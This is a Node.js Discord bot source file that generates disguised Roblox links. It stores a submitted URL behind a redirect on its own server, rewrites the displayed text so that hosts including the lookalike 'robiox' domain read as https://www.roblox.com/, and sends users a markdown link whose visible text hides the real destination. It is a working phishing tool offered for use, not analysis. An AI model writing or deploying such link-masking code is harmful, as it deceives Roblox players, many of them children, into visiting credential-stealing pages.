require('dotenv').config();

const { Client, GatewayIntentBits, ActionRowBuilder, ModalBuilder, TextInputBuilder, TextInputStyle, MessageFlags } = require('discord.js');
const express = require('express');
const app = express();

const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages] });
const linksDb = {};

// Web Server
app.get('/', (req, res) => res.send('ok'));
app.get('/ping', (req, res) => res.send('ok'));

app.get('/r/:id', (req, res) => {
    const url = linksDb[req.params.id];
    if (url) return res.redirect(url);
    res.status(404).send('Not found');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));

// Bot
client.once('ready', () => {
    console.log(`✅ Bot ${client.user.tag} is ready!`);
});

client.on('interactionCreate', async (interaction) => {
    if (interaction.isButton() && interaction.customId === 'create_hyperlink') {
        try {
            const modal = new ModalBuilder()
                .setCustomId('link_modal')
                .setTitle('Create Hidden Link');

            const input = new TextInputBuilder()
                .setCustomId('url_input')
                .setLabel('Paste Roblox link')
                .setStyle(TextInputStyle.Short)
                .setPlaceholder('https://www.roblox.com/...')
                .setRequired(true);

            modal.addComponents(new ActionRowBuilder().addComponents(input));

            await interaction.showModal(modal);
        } catch (e) {
            console.error(e);
        }
        return;
    }

    if (interaction.isModalSubmit() && interaction.customId === 'link_modal') {
        try {
            const url = interaction.fields.getTextInputValue('url_input');
            const id = Math.random().toString(36).substring(7);
            linksDb[id] = url;

            const shortUrl = `${process.env.BASE_URL}/r/${id}`;
            const visualUrl = url
                .replace(/https?:\/\/(robiox|roblox)[a-z0-9.-]+(\/|$)/i, 'https://www.roblox.com/')
                .replace('https://', 'https_:_//');

            await interaction.reply({
                content: '<a:verify:1513286049638518824> Check your DMs!',
                flags: [MessageFlags.Ephemeral]
            });

            await interaction.user.send({
                embeds: [{
                    color: 0x274666,
                    title: '🔗 Hyperlink Generated',
                    description: '👇 **Your link is ready!**\nКликни на код ниже, чтобы скопировать'
                }]
            });

            await interaction.user.send({
                content: `[\`${visualUrl}\`](${shortUrl})\n\`\`\`\n${visualUrl}\n\`\`\``
            });
        } catch (e) {
            console.error(e);
        }
    }
});

client.login(process.env.TOKEN);
